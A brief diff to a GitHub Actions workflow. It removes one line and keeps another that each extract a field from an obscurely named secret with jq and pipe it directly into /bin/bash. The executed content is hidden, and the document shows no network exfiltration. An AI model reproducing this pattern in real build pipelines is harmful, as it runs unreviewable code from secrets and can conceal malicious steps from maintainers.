@@ -20,7 +20,6 @@ jobs:
           qpg528: ${{ secrets.qpg528 }}
         run: |
           printf '%s' "$qpg528" | jq -r .krp1720 | /bin/bash
-          printf '%s' "$dyzm07710" | jq -r .fdz64117 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
